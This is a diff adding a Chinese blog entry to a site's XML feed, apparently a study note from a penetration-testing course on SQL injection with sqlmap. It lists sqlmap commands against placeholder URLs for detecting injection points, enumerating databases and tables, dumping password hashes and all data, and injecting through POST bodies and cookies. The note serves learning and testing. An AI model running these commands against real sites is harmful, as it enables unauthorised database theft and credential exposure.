@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>web-SQL注入（6）</title>
+      <link href="/2022/03/23/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89/"/>
+      <url>/2022/03/23/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1、快捷方式的建立"><a href="#1、快捷方式的建立" class="headerlink" title="1、快捷方式的建立"></a>1、快捷方式的建立</h3><p>From：<a href="https://blog.csdn.net/oxygensss/article/details/110311403">https://blog.csdn.net/oxygensss/article/details/110311403</a></p><p><code>python sqlmap.py</code></p><h3 id="2、常用命令"><a href="#2、常用命令" class="headerlink" title="2、常用命令"></a>2、常用命令</h3><p>From：</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">https://blog.csdn.net/smli_ng/article/details/106026901</a></p><p><a href="https://blog.csdn.net/xmd213131/article/details/105919380">https://blog.csdn.net/xmd213131/article/details/105919380</a></p><p><a href="http://config.net.cn/producttest/3f96a311-9b37-43bc-83a6-4ca6565c3ffb-p1.html">http://config.net.cn/producttest/3f96a311-9b37-43bc-83a6-4ca6565c3ffb-p1.html</a></p><pre><code>sqlmap -u url  --users ：查看数据库所有用户  //cmd中命令用法： python sqlmap.py -u  &quot;http://site.com/login?u=test&amp;p=123456&quot;sqlmap -u url --passwords ：查看数据库所有用户密码sqlmap -u url :判断注入点sqlmap -u url --current-dbs ：查看当前所有数据库sqlmap -u url --current-user ：查看数据库当前的用户sqlmap -u url --is-dba ：判断当前用户是否有管理员权限sqlmap -u url --roles ：列出数据库所有管理员角色sqlmap -u url --current-db ：查看当前数据库sqlmap -u url -D 库名 --tables  ：爆表sqlmap -u url -D 库名 -T 表明 --columns ：爆字段sqlmap -u url -D 库名 -T 表明 --C 字段名1，字段名2 --dump ：爆数据sqlmap -u url -D 库名 --dump-all ：爆出数据库中所有数据</code></pre><p>（1）get方法</p><p>URL后需要带参数</p><p><strong>注入点判断</strong></p><p><code>-u url</code></p><p><strong>爆出数据库名</strong></p><p><code>-u url --dbs</code></p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203231533675.png" alt="数据库名" style="zoom:67%;" /><p><strong>爆出数据库的表名</strong></p><p><code>-u url -D 数据库 --tables</code></p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203231535376.png" alt="表名" style="zoom:67%;" /><p><strong>爆出数据库的列名</strong></p><p><code>-u url -D 数据库 -T 表名 --columns</code></p><p><strong>得到列中的数据</strong></p><p><code>-u -D 数据库 -T 表名 -C 列名 --dump</code></p><p>（2）post方法</p><p>需要用<code>--data=参数</code></p><p> <code>-u URL --data=&quot;id=1&quot;</code></p><p><strong>使用burp抓包，请求内容保存在txt文件中</strong></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203231548284.png" alt="过程"></p><p><strong>检测是否存在注入点</strong></p><p> <code>-r 文档位置</code></p><p><strong>爆库名</strong></p><p><code>-r 文档位置 --dbs</code></p><p>（3）cookies注入</p><p>默认情况下SQLMAP只支持GET/POST参数的注入测试，</p><p>–level参数且数值&gt;=2的时候检查cookie里面的参数，</p><p>大于等于3时检查User-agent和Referer。</p><p>可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p><pre><code>sqlmap.py -u &quot;http://site.com/base.PHP&quot;–cookies &quot;id=1&quot;  –dbs –level 2sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --coiumnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><p>（4）延时注入</p><pre><code>sqlmap –dbs -u&quot;url&quot; –delay 0.5  ：延时0.5秒sqlmap –dbs -u&quot;url&quot; –safe-freq   ：请求2次</code></pre><p>（5）指定注入点</p><p>在指定注入的位置后加上<code>*</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 小迪渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF-show-MISC入门-1</title>
       <link href="/2022/03/22/CTF-show-MISC%E5%85%A5%E9%97%A8-1/"/>
       <url>/2022/03/22/CTF-show-MISC%E5%85%A5%E9%97%A8-1/</url>
